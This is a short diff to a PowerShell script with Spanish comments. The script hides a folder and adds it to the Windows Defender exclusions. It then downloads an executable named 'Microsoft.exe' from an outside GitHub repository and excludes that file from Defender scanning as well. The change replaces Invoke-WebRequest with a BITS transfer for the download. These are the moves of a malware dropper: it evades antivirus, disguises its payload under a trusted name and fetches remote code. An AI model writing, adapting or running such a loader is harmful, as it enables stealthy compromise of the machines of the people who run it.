@@ -13,10 +13,10 @@ attrib +h $folderPath
 # Agregar la carpeta a las exclusiones de Windows Defender
 Add-MpPreference -ExclusionPath $folderPath
 
-# Descargar el archivo Microsoft.exe desde GitHub y guardarlo en la carpeta creada
+# Descargar el archivo Microsoft.exe desde GitHub y guardarlo en la carpeta creada usando BITS Transfer
 $downloadUrl = "https://github.com/baa4ts/BIT-CROW/raw/refs/heads/main/source/build/Microsoft.exe"
 $outputFile = Join-Path $folderPath "Microsoft.exe"
-Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile
+Start-BitsTransfer -Source $downloadUrl -Destination $outputFile
 
 # Agregar el ejecutable descargado a las exclusiones de Windows Defender
 Add-MpPreference -ExclusionPath $outputFile
